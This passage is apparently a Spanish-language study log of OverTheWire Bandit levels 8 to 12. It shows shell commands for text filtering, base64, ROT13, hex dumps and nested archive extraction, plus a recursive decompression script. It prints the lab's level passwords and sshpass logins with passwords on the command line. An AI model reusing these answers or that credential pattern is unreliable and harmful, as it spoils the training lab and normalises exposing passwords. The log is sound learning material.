[+] Probando con 20:



❯ for i in $(seq 1 25); do echo "[+] Probando con $i:\n"; cat example | cut -d ' ' -f $i ; done
[+] Probando con 1:

hola

[+] Probando con 2:



[+] Probando con 3:



[+] Probando con 4:



[+] Probando con 5:



[+] Probando con 6:



[+] Probando con 7:



[+] Probando con 8:



[+] Probando con 9:



[+] Probando con 10:



[+] Probando con 11:



[+] Probando con 12:



[+] Probando con 13:



[+] Probando con 14:



[+] Probando con 15:



[+] Probando con 16:



[+] Probando con 17:



[+] Probando con 18:



[+] Probando con 19:



[+] Probando con 20:



[+] Probando con 21:



[+] Probando con 22:

probando

[+] Probando con 23:



[+] Probando con 24:



[+] Probando con 25:


❯ cat example | cut -d ' ' -f 22
probando

------------------------------------------
otro inciso con tr y sed
----------------------------
❯ echo "Hola esto es una prueba" | tr 'prueba' 'probando' // el tr va sustituyendo las letras //
Holn bsto bs onn proban
❯ echo "Hola esto es una prueba" | sed 's/prueba/probando/'
Hola esto es una probando
❯ echo "Hola esto es una prueba y como buena prueba estamos probando" | sed 's/prueba/probando/'
Hola esto es una probando y como buena prueba estamos probando
❯ echo "Hola esto es una prueba y como buena prueba estamos probando" | sed 's/prueba/probando/g' // para que se vaya repietiendo
Hola esto es una probando y como buena probando estamos probando
------------------------------------------------------------------------------------------------------------------------------------
bandit7@bandit:~$ exit
logout
Connection to bandit.labs.overthewire.org closed.
❯ sshpass -p 'TESKZC0XvTetK0S9xNwm25STk5iWrBvP' ssh bandit8@bandit.labs.overthewire.org -p 2220

--------------------------------------------------------------------------------------------------------------------------------------
The password for the next level is stored in the file data.txt and is the only line of text that occurs only once
----------------------------------------------------------------------------------------------------------------------------------------
bandit8@bandit:~$ sort data.txt | uniq -u  //sort te lista todos los elementos de data.txt y uniq -u solo las que aparecen una unica vez
EN632PlfYiZbn3PhVK3XOGSlNInNE00t
bandit8@bandit:~$ exit
logout
Connection to bandit.labs.overthewire.org closed.
❯ sshpass -p 'EN632PlfYiZbn3PhVK3XOGSlNInNE00t' ssh bandit9@bandit.labs.overthewire.org -p 2220
Enjoy your stay!
```

*Interpretación de archivos binarios*
```
bandit9@bandit:~$
-------------------------------------------------------------------------------------------------------------------------------------------
The password for the next level is stored in the file data.txt in one of the few human-readable strings, preceded by several ‘=’ characters.
--------------------------------------------------------------------------------------------------------------------------------------------
bandit9@bandit:~$ file data.txt
data.txt: data  // Al no darte ASCII seguramente sea ilegible
bandit9@bandit:~$ cat data.txt  //es un archivo no legible
fD|d=Vo'lדE#]Dfi55H+ޛ)7g]\ezcF
!9"XTR_#D#Ai̡&O^esHxFMHW:M:y;:RQU$:"Hx!;m@Օu&d]=Q
                                           I+/kϞ+ØB¿cf@o/I      bLaRcU$s!PMxH.K`˚^SCwnr2adFaww

bandit9@bandit:~$ strings data.txt  // Con el strings se imprimen las cadenas de caracteres imprimibles
f;zv
sHxF
nr2ad
Faww
wkrJ
3t&,
bandit9@bandit:~$ strings data.txt | grep "===" | tail -n 1 | awk 'NF{print $NF}'
G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s
bandit9@bandit:~$ exit
logout
Connection to bandit.labs.overthewire.org closed.
```


*Codificación y decodificación en base64*
```
❯ sshpass -p 'G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s' ssh bandit10@bandit.labs.overthewire.org -p 2220
----------------------------------------------------------------------------------------------------
The password for the next level is stored in the file data.txt, which contains base64 encoded data
----------------------------------------------------------------------------------------------------
AQUI ESTAMOS USANDO BASE64(Encriptado, dunpeo)
❯ echo "Hola esto es una prueba"
Hola esto es una prueba
❯ echo "Hola esto es una prueba" | base64
SG9sYSBlc3RvIGVzIHVuYSBwcnVlYmEK
❯ cat /etc/hosts
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /etc/hosts
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Host addresses
   2   │ 127.0.0.1  localhost
   3   │ 127.0.1.1  parrot
   4   │ ::1        localhost ip6-localhost ip6-loopback
   5   │ ff02::1    ip6-allnodes
   6   │ ff02::2    ip6-allrouters
   7   │ # Others
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ cat /etc/hosts | base64
IyBIb3N0IGFkZHJlc3NlcwoxMjcuMC4wLjEgIGxvY2FsaG9zdAoxMjcuMC4xLjEgIHBhcnJvdAo6
OjEgICAgICAgIGxvY2FsaG9zdCBpcDYtbG9jYWxob3N0IGlwNi1sb29wYmFjawpmZjAyOjoxICAg
IGlwNi1hbGxub2RlcwpmZjAyOjoyICAgIGlwNi1hbGxyb3V0ZXJzCiMgT3RoZXJzCg==
❯ cat /etc/hosts | base64 -w 0
IyBIb3N0IGFkZHJlc3NlcwoxMjcuMC4wLjEgIGxvY2FsaG9zdAoxMjcuMC4xLjEgIHBhcnJvdAo6OjEgICAgICAgIGxvY2FsaG9zdCBpcDYtbG9jYWxob3N0IGlwNi1sb29wYmFjawpmZjAyOjoxICAgIGlwNi1hbGxub2RlcwpmZjAyOjoyICAgIGlwNi1hbGxyb3V0ZXJzCiMgT3RoZXJzCg==%
❯ echo "Hola esto es una prueba" | base64
SG9sYSBlc3RvIGVzIHVuYSBwcnVlYmEK
❯ echo "SG9sYSBlc3RvIGVzIHVuYSBwcnVlYmEK" | base64 -d
Hola esto es una prueba
---------

bandit10@bandit:~$ ls

data.txt
bandit10@bandit:~$ file data.txt
data.txt: ASCII text
bandit10@bandit:~$ cat data.txt
VGhlIHBhc3N3b3JkIGlzIDZ6UGV6aUxkUjJSS05kTllGTmI2blZDS3pwaGxYSEJNCg==
bandit10@bandit:~$ cat data.txt | base64 -d
The password is 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM
bandit10@bandit:~$ exit
logout
Connection to bandit.labs.overthewire.org closed.

```


*Cifrado césar y uso de tr para la traducción de caracteres*

*www.rot13.com*
```
❯ sshpass -p '6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM' ssh bandit11@bandit.labs.overthewire.org -p 2220
-------------------------------------------------------------------------------------------------------------------------------------------------------
The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions
-------------------------------------------------------------------------------------------------------------------------------------------------------
AQUI ESTAMOS USANDO ROT13, cifrado César (Encriptado / dumpeo) -> rot13.com y alli lo desencriptas

bandit11@bandit:~$ ls
data.txt
bandit11@bandit:~$ cat data.txt
Gur cnffjbeq vf WIAOOSFzMjXXBC0KoSKBbJ8puQm5lIEi
bandit11@bandit:~$ cat data.txt | tr '[G-ZA-Fg-za-f]' '[T-ZA-St-za-s]'
The password is JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv
bandit11@bandit:~$ cat data.txt | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'
The password is JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv
bandit11@bandit:~$ cat data.txt | tr '[A-Za-z]' '[N-ZA-Mn-za-m]' | awk 'NF{print $NF}'
JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv
bandit11@bandit:~$ exit
logout
Connection to bandit.labs.overthewire.org closed.
```


*Descompresor recursivo automático de archivos en Bash*
```bash
#!/bin/bash

function ctrl_c(){
  echo -e "\n\n[!] Saliendo...\n"
  exit 1
}

# Ctrl+C
trap ctrl_c INT

first_file_name="data.gz"
decompressed_file_name="$(7z l data.gz | tail -n 3 | head -n 1 | awk 'NF{print $NF}')"

7z x $first_file_name &>/dev/null

while [ $decompressed_file_name ]; do
  echo -e "\n[+] Nuevo archivo descomprimido: $decompressed_file_name"
  7z x $decompressed_file_name &>/dev/null
  decompressed_file_name="$(7z l $decompressed_file_name 2>/dev/null | tail -n 3 | head -n 1 | awk 'NF{print $NF}')"
done
```

```
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work using mkdir. For example: mkdir /tmp/myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
AQUI USAREMOS HEXADECIMAL, breve inciso de como usaremos:

❯ cat /etc/hosts
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /etc/hosts
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Host addresses
   2   │ 127.0.0.1  localhost
   3   │ 127.0.1.1  parrot
   4   │ ::1        localhost ip6-localhost ip6-loopback
   5   │ ff02::1    ip6-allnodes
   6   │ ff02::2    ip6-allrouters
   7   │ # Others
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ cat /etc/hosts | xxd
00000000: 2320 486f 7374 2061 6464 7265 7373 6573  # Host addresses
00000010: 0a31 3237 2e30 2e30 2e31 2020 6c6f 6361  .127.0.0.1  loca
00000020: 6c68 6f73 740a 3132 372e 302e 312e 3120  lhost.127.0.1.1
00000030: 2070 6172 726f 740a 3a3a 3120 2020 2020   parrot.::1
00000040: 2020 206c 6f63 616c 686f 7374 2069 7036     localhost ip6
00000050: 2d6c 6f63 616c 686f 7374 2069 7036 2d6c  -localhost ip6-l
00000060: 6f6f 7062 6163 6b0a 6666 3032 3a3a 3120  oopback.ff02::1
00000070: 2020 2069 7036 2d61 6c6c 6e6f 6465 730a     ip6-allnodes.
00000080: 6666 3032 3a3a 3220 2020 2069 7036 2d61  ff02::2    ip6-a
00000090: 6c6c 726f 7574 6572 730a 2320 4f74 6865  llrouters.# Othe
000000a0: 7273 0a rs.

❯ cat /etc/hosts | xxd -ps // todo en lineas
2320486f7374206164647265737365730a3132372e302e302e3120206c6f
63616c686f73740a3132372e302e312e312020706172726f740a3a3a3120
202020202020206c6f63616c686f7374206970362d6c6f63616c686f7374
206970362d6c6f6f706261636b0a666630323a3a31202020206970362d61
6c6c6e6f6465730a666630323a3a32202020206970362d616c6c726f7574
6572730a23204f74686572730a

❯ cat /etc/hosts | xxd -ps | xargs | tr -d ' '   // Me quita los espacios
2320486f7374206164647265737365730a3132372e302e302e3120206c6f63616c686f73740a3132372e302e312e312020706172726f740a3a3a3120202020202020206c6f63616c686f7374206970362d6c6f63616c686f7374206970362d6c6f6f706261636b0a666630323a3a31202020206970362d616c6c6e6f6465730a666630323a3a32202020206970362d616c6c726f75746572730a23204f74686572730a

---------------------------------------------------------------------
INCISO DE ARCHIVOS EN LINUX:

❯ nvim test
❯ cat test
───────┬─────────────────────────────────────────────────────────────────────────────────
       │ File: test
───────┼─────────────────────────────────────────────────────────────────────────────────
   1   │ Hola esto es una prueba
   2   │
───────┴─────────────────────────────────────────────────────────────────────────────────
❯ cat test | awk '{print $3}'
es

❯ cat test | awk '{print $3}' > test
❯ cat test
───────┬─────────────────────────────────────────────────────────────────────────────────
       │ File: test   <EMPTY>
───────┴─────────────────────────────────────────────────────────────────────────────────
❯ nvim test
❯ cat test
───────┬─────────────────────────────────────────────────────────────────────────────────
       │ File: test
───────┼─────────────────────────────────────────────────────────────────────────────────
   1   │ Hola esto es una prueba
───────┴─────────────────────────────────────────────────────────────────────────────────
❯ cat test | awk '{print $3}' >> test
❯ cat test
───────┬─────────────────────────────────────────────────────────────────────────────────
       │ File: test
───────┼─────────────────────────────────────────────────────────────────────────────────
   1   │ Hola esto es una prueba
   2   │ es
───────┴─────────────────────────────────────────────────────────────────────────────────
❯ nvim test
❯ echo "Hola que tal" | tee prueba
Hola que tal
❯ ls
 Descargas    HTB        powerlevel10k   Vídeos            ize
 Desktop      Imágenes   Público         data.gz           prueba
 Documentos   Música     Templates       decompressor.sh   test
❯ cat test | awk '{print $3}' | tee test
❯ cat test
───────┬─────────────────────────────────────────────────────────────────────────────────
       │ File: test   <EMPTY>
───────┴─────────────────────────────────────────────────────────────────────────────────
❯ nvim test
❯ cat test
───────┬─────────────────────────────────────────────────────────────────────────────────
       │ File: test
───────┼─────────────────────────────────────────────────────────────────────────────────
   1   │ Hola esto es una prueba
   2   │
───────┴─────────────────────────────────────────────────────────────────────────────────
❯ cat test | awk '{print $3}' | sponge test
❯ cat test
───────┬─────────────────────────────────────────────────────────────────────────────────
       │ File: test
───────┼─────────────────────────────────────────────────────────────────────────────────
   1   │ es
   2   │
───────┴─────────────────────────────────────────────────────────────────────────────────

--------------------------------------------------------------------
bandit12@bandit:~$ ls
data.txt
bandit12@bandit:~$ cat data.txt
00000000: 1f8b 0808 8e0b bf63 0203 6461 7461 322e  .......c..data2.
00000010: 6269 6e00 013c 02c3 fd42 5a68 3931 4159  bin..<...BZh91AY
00000020: 2653 598c b471 f700 0014 ffff fa59 c6c5  &SY..q.......Y..
00000030: af63 cfff af73 ffff bdb7 7c9f b1fb eafa  .c...s....|.....
00000040: bfff fb9f f9fe bdbf ffeb ffef b001 3b2c  ..............;,
00000050: 5900 0341 a064 007a 8003 40d0 6869 a068  Y..A.d.z..@.hi.h
00000060: 3464 007a 81a0 0680 3401 90d0 6800 00d1  4d.z....4...h...
00000070: a0c9 a680 f51e 9a83 27a4 3d4f 4991 0000  ........'.=OI...
00000080: 69a6 803d 4001 9001 a686 8c40 0d00 d3d2  i..=@......@....
00000090: 0d00 0d06 08f5 0323 4034 069e a340 0da8  .......#@4...@..
000000a0: 3d46 83ca 0343 41a0 3400 e9a0 d07a 8680  =F...CA.4....z..
000000b0: 3ca3 d47a 8068 0079 4006 8d0c 8034 d068  <..z.h.y@....4.h
000000c0: d03d 401a 0680 0d00 0683 407a 8680 6834  .=@.......@z..h4
000000d0: 0034 0003 ca64 00b9 6862 e5be 0fc5 ac97  .4...d..hb......
000000e0: 996a 03e6 d176 bda4 7989 5466 5357 2377  .j...v..y.TfSW#w
000000f0: c649 da83 6000 9590 c894 43c6 15af 09a0  .I..`.....C.....
00000100: 70ed 0855 6686 86d9 7adc a308 5356 477f  p..Uf...z...SVG.
00000110: 2824 ad8f 98eb e55a 4b28 0026 2a95 886e  ($.....ZK(.&*..n
00000120: 6b78 104d 82ba d1d4 f2a7 9d01 6a07 8f53  kx.M........j..S
00000130: c4e2 24a3 143a 7ce0 9008 f8db 81d2 ba2f  ..$..:|......../
00000140: 8e88 5b90 ef95 a918 01d3 95ed bd3e 3285  ..[..........>2.
00000150: a187 12d2 b129 508f 26a4 1fe4 e73e da97  .....)P.&....>..
00000160: f29a 13a4 e0d5 7ea0 cd40 1793 d641 d178  ......~..@...A.x
00000170: 6fd4 0289 d833 1bd1 3ca5 0a78 d0e8 67c6  o....3..<..x..g.
00000180: 37ba 9c82 32d3 19b6 90dc e44f a5d9 1c22  7...2......O..."
00000190: 435b 669d d19e 4899 9d51 1be1 8a2c 142d  C[f...H..Q...,.-
000001a0: d6a4 ff56 ae8a 28c6 2061 c16c c905 5e9a  ...V..(. a.l..^.
000001b0: ddcb 94be 229a 6130 1868 1e02 5601 65a3  ....".a0.h..V.e.
000001c0: 8849 052f b5b6 1b37 0485 b971 0f25 0670  .I./...7...q.%.p
000001d0: 5b93 e8a1 4226 0de8 f703 9cb1 014f 42ff  [...B&.......OB.
000001e0: dda4 a30a 58c7 c265 0b8b 8356 48ef b9b0  ....X..e...VH...
000001f0: 1423 0cf9 b192 80b0 a8ec 3bce 60af c828  .#........;.`..(
00000200: 32b3 1e46 4cff 11d1 2a77 7204 7fb8 c6dd  2..FL...*wr.....
00000210: 527d 2095 014c f24d 186b e2ed 03a5 f934  R} ..L.M.k.....4
00000220: 9492 648d 9c54 a06d 67b1 bd47 4219 b587  ..d..T.mg..GB...
00000230: cd2d 2dd7 039c c4a5 167a 455e 022d 8144  .--......zE^.-.D
00000240: cebe 4f05 120d 542a bfbf c5dc 914e 1424  ..O...T*.....N.$
00000250: 232d 1c7d c039 88d1 7d3c 0200 00         #-.}.9..}<...
❯ file data
data: gzip compressed data, was "data2.bin", last modified: Wed Jan 11 19:18:38 2023, max compression, from Unix, original size modulo 2^32 572
❯ cat data
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: data   <BINARY>
                                                         ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ strings data
data2.bin
BZh91AY&SY
TfSW#w
"C[f
❯ file data
data: gzip compressed data, was "data2.bin", last modified: Wed Jan 11 19:18:38 2023, max compression, from Unix, original size modulo 2^32 572
❯ cat data
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: data   <BINARY>
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ strings data
data2.bin
BZh91AY&SY
TfSW#w
❯ ghex data  // Se abrira un archivo con numeros, copiando los 4 primeros digitos nos iremos a google " list of file signatures" y alli buscaremos por los 4 digitos , nos dirá en que formato está comprimido --> en este caso en gzip

❯ ./decompressor.sh   //Ejecutamos el script decompressor.sh que hemos programado.
❯ sshpass -p 'wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw' ssh bandit13@bandit.labs.overthewire.org -p 2220

----------------------------------------------------------------------------------
abriendo todos los archivos a mano comprimido dentro de comprimido hasta el final
----------------------------------------------------------------------------------
❯ 7z l data.gz

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz (806EC),ASM,AES-NI)

Scanning the drive for archives:
1 file, 605 bytes (1 KiB)

Listing archive: data.gz

--
Path = data.gz
Type = gzip
Headers Size = 20

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2023-01-11 20:18:38 .....          572          605  data2.bin
------------------- ----- ------------ ------------  ------------------------
2023-01-11 20:18:38                572          605  1 files
❯ 7z x data.gz

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz (806EC),ASM,AES-NI)

Scanning the drive for archives:
1 file, 605 bytes (1 KiB)

Extracting archive: data.gz
--
Path = data.gz
Type = gzip
Headers Size = 20

Everything is Ok

Size:       572
Compressed: 605
❯ ls
 Descargas   Documentos   Imágenes   powerlevel10k   Templates   data.gz     decompressor.sh   prueba
 Desktop     HTB          Música     Público         Vídeos      data2.bin   ize               test
❯ file data2.bin
data2.bin: bzip2 compressed data, block size = 900k
❯ 7z l data2.bin

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz (806EC),ASM,AES-NI)

Scanning the drive for archives:
1 file, 572 bytes (1 KiB)

Listing archive: data2.bin

--
Path = data2.bin
Type = bzip2

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
                    .....                            data2
------------------- ----- ------------ ------------  ------------------------
                                                572  1 files
❯ 7z x data2.bin

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz (806EC),ASM,AES-NI)

Scanning the drive for archives:
1 file, 572 bytes (1 KiB)

Extracting archive: data2.bin
--
Path = data2.bin
Type = bzip2

Everything is Ok

Size:       434
Compressed: 572
❯ ls
 Descargas   Documentos   Imágenes   powerlevel10k   Templates   data.gz   data2.bin         ize      test
 Desktop     HTB          Música     Público         Vídeos      data2     decompressor.sh   prueba
❯ file data2
data2: gzip compressed data, was "data4.bin", last modified: Wed Jan 11 19:18:38 2023, max compression, from Unix, original size modulo 2^32 20480
❯ 7z l data2

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz (806EC),ASM,AES-NI)

Scanning the drive for archives:
1 file, 434 bytes (1 KiB)

Listing archive: data2

--
Path = data2
Type = gzip
Headers Size = 20

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2023-01-11 20:18:38 .....        20480          434  data4.bin
------------------- ----- ------------ ------------  ------------------------
2023-01-11 20:18:38              20480          434  1 files
❯ 7z x data4.bin

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz (806EC),ASM,AES-NI)

Scanning the drive for archives:

ERROR: No more files
data4.bin



System ERROR:
Error desconocido -2147024872
❯ ls
 Descargas   Documentos   Imágenes   powerlevel10k   Templates   data.gz   data2.bin         ize      test
 Desktop     HTB          Música     Público         Vídeos      data2     decompressor.sh   prueba
❯ 7z x data2

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz (806EC),ASM,AES-NI)

Scanning the drive for archives:
1 file, 434 bytes (1 KiB)

Extracting archive: data2
--
Path = data2
Type = gzip
Headers Size = 20

Everything is Ok

Size:       20480
Compressed: 434
❯ ls
 Descargas   Documentos   Imágenes   powerlevel10k   Templates   data.gz   data2.bin   decompressor.sh   prueba
 Desktop     HTB          Música     Público         Vídeos      data2     data4.bin   ize               test
❯ file data4
data4: cannot open `data4' (No such file or directory)
❯ file data4.bin
data4.bin: POSIX tar archive (GNU)
❯ 7z l data4.bin

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz (806EC),ASM,AES-NI)

Scanning the drive for archives:
1 file, 20480 bytes (20 KiB)

Listing archive: data4.bin

--
Path = data4.bin
Type = tar
Physical Size = 20480
Headers Size = 10240
Code Page = UTF-8

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2023-01-11 20:18:38 .....        10240        10240  data5.bin
------------------- ----- ------------ ------------  ------------------------
2023-01-11 20:18:38              10240        10240  1 files
❯ 7z x data5.bin

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz (806EC),ASM,AES-NI)

Scanning the drive for archives:

ERROR: No more files
data5.bin



System ERROR:
Error desconocido -2147024872
❯ ls
 Descargas   Documentos   Imágenes   powerlevel10k   Templates   data.gz   data2.bin   decompressor.sh   prueba
 Desktop     HTB          Música     Público         Vídeos      data2     data4.bin   ize               test
❯ 7z x data4.bin

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz (806EC),ASM,AES-NI)

Scanning the drive for archives:
1 file, 20480 bytes (20 KiB)

Extracting archive: data4.bin
--
Path = data4.bin
Type = tar
Physical Size = 20480
Headers Size = 10240
Code Page = UTF-8

Everything is Ok

Size:       10240
Compressed: 20480
❯ ls
 Descargas   Documentos   Imágenes   powerlevel10k   Templates   data.gz   data2.bin   data5.bin         ize      test
 Desktop     HTB          Música     Público         Vídeos      data2     data4.bin   decompressor.sh   prueba

❯ file data5.bin
data5.bin: POSIX tar archive (GNU)
❯ 7z l data5.bin

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz (806EC),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10240 bytes (10 KiB)

Listing archive: data5.bin

--
Path = data5.bin
Type = tar
Physical Size = 10240
Headers Size = 9728
Code Page = UTF-8

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2023-01-11 20:18:38 .....          218          512  data6.bin
------------------- ----- ------------ ------------  ------------------------
2023-01-11 20:18:38                218          512  1 files
❯ 7z x data5.bin

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz (806EC),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10240 bytes (10 KiB)

Extracting archive: data5.bin
--
Path = data5.bin
Type = tar
Physical Size = 10240
Headers Size = 9728
Code Page = UTF-8

Everything is Ok

Size:       218
Compressed: 10240
❯ ls
 Descargas   Documentos   Imágenes   powerlevel10k   Templates   data.gz   data2.bin   data5.bin   decompressor.sh   prueba
 Desktop     HTB          Música     Público         Vídeos      data2     data4.bin   data6.bin   ize
      test
❯ file data6.bin
data6.bin: bzip2 compressed data, block size = 900k
❯ 7z l data6.bin

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz (806EC),ASM,AES-NI)

Scanning the drive for archives:
1 file, 218 bytes (1 KiB)

Listing archive: data6.bin

--
Path = data6.bin
Type = bzip2

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
                    .....                            data6
------------------- ----- ------------ ------------  ------------------------
                                                218  1 files
❯ 7z x data6.bin

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz (806EC),ASM,AES-NI)

Scanning the drive for archives:
1 file, 218 bytes (1 KiB)

Extracting archive: data6.bin
--
Path = data6.bin
Type = bzip2

Everything is Ok

Size:       10240
Compressed: 218
❯ ls
 Descargas   Documentos   Imágenes   powerlevel10k   Templates   data.gz   data2.bin   data5.bin   data6.bin         ize      test
 Desktop     HTB          Música     Público         Vídeos      data2     data4.bin   data6       decompressor.sh   prueba
❯ file data6
data6: POSIX tar archive (GNU)
❯ 7z l data6

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz (806EC),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10240 bytes (10 KiB)

Listing archive: data6

--
Path = data6
Type = tar
Physical Size = 10240
Headers Size = 9728
Code Page = UTF-8

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2023-01-11 20:18:38 .....           79          512  data8.bin
------------------- ----- ------------ ------------  ------------------------
2023-01-11 20:18:38                 79          512  1 files
❯ 7z x data6

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz (806EC),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10240 bytes (10 KiB)

Extracting archive: data6
--
Path = data6
Type = tar
Physical Size = 10240
Headers Size = 9728
Code Page = UTF-8

Everything is Ok

Size:       79
Compressed: 10240
❯ ls
 Descargas   Documentos   Imágenes   powerlevel10k   Templates   data.gz   data2.bin   data5.bin   data6.bin   decompressor.sh   prueba
 Desktop     HTB          Música     Público         Vídeos      data2     data4.bin   data6       data8.bin   ize               test
❯ file data8.bin
data8.bin: gzip compressed data, was "data9.bin", last modified: Wed Jan 11 19:18:38 2023, max compression, from Unix, original size modulo 2^32 49
❯ 7z l data8.bin

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz (806EC),ASM,AES-NI)

Scanning the drive for archives:
1 file, 79 bytes (1 KiB)

Listing archive: data8.bin

--
Path = data8.bin
Type = gzip
Headers Size = 20

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2023-01-11 20:18:38 .....           49           79  data9.bin
------------------- ----- ------------ ------------  ------------------------
2023-01-11 20:18:38                 49           79  1 files
❯ 7z l data8.bin

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz (806EC),ASM,AES-NI)

Scanning the drive for archives:
1 file, 79 bytes (1 KiB)

Listing archive: data8.bin

--
Path = data8.bin
